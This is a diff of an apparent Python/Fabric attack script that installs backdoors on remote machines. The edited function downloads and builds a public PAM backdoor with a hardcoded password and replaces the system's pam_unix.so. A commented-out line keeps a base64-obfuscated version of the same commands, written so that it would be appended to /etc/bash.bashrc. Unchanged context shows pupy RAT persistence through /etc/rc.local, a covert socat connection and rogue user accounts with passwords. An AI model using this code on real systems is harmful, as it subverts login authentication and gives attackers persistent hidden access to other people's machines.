@@ -9,11 +9,11 @@ def backdoor_web_shell(connect):
 
 
 def backdoor_pam(connect):
-    connect.sudo("sh -c 'echo "
-                 "\"YXB0LWdldCBpbnN0YWxsIGdpdCAteQpnaXQgY2xvbmUgaHR0cHM6Ly9naXRodWIuY29tL3plcGhyYXgvbGludXgtcGFtLWJhY2t"
-                 "kb29yLmdpdApjZCBsaW51eC1wYW0tYmFja2Rvb3IvCi4vYmFja2Rvb3Iuc2ggLXYgMS4xLjggLXAgbTAwZHkKbXYgcGFtX3VuaXgu"
-                 "c28gL2xpYi94ODZfNjQtbGludXgtZ251L3NlY3VyaXR5LwpybSAtcmYgbGludXgtcGFtLWJhY2tkb29yLw==\" | base64 -d |"
-                 " sudo tee -a /etc/bash.bashrc'")
+    # connect.sudo("rm -rf linux-pam-backdoor")
+    connect.sudo("apt-get install git -y")
+    connect.sudo("git clone https://github.com/zephrax/linux-pam-backdoor.git")
+    connect.sudo("sh -c 'cd linux-pam-backdoor/ && ./backdoor.sh -v 1.1.8 -p m00dy && mv pam_unix.so /lib/x86_64-linux-gnu/security/ && cd .. && rm -rf linux-pam-backdoor/'")
+    # connect.sudo("sh -c 'echo \"YXB0LWdldCBpbnN0YWxsIGdpdCAteQpnaXQgY2xvbmUgaHR0cHM6Ly9naXRodWIuY29tL3plcGhyYXgvbGludXgtcGFtLWJhY2tkb29yLmdpdApjZCBsaW51eC1wYW0tYmFja2Rvb3IvCi4vYmFja2Rvb3Iuc2ggLXYgMS4xLjggLXAgbTAwZHkKbXYgcGFtX3VuaXguc28gL2xpYi94ODZfNjQtbGludXgtZ251L3NlY3VyaXR5LwpybSAtcmYgbGludXgtcGFtLWJhY2tkb29yLw==\" | base64 -d | sudo tee -a /etc/bash.bashrc'")
 
 
 def backdoor_ssh(connect):
@@ -25,7 +25,6 @@ def backdoor_ssh(connect):
 # socat STDIO TCP4:10.15.2.3:22,sourceport=19526
 # badmin VerySecure
 # totally_legit_user VerySecure
-
 
 
 def backdoor_pfsense_user(connect):
@@ -40,5 +39,4 @@ def backdoor_pupy(connect):
     connect.sudo('printf \"#!/bin/bash\n/bin/./pupy\nexit 0\" > /etc/rc.local')
     connect.sudo('/bin/./pupy')
 
-
-#Up to implementation: merlin
+# Up to implementation: merlin
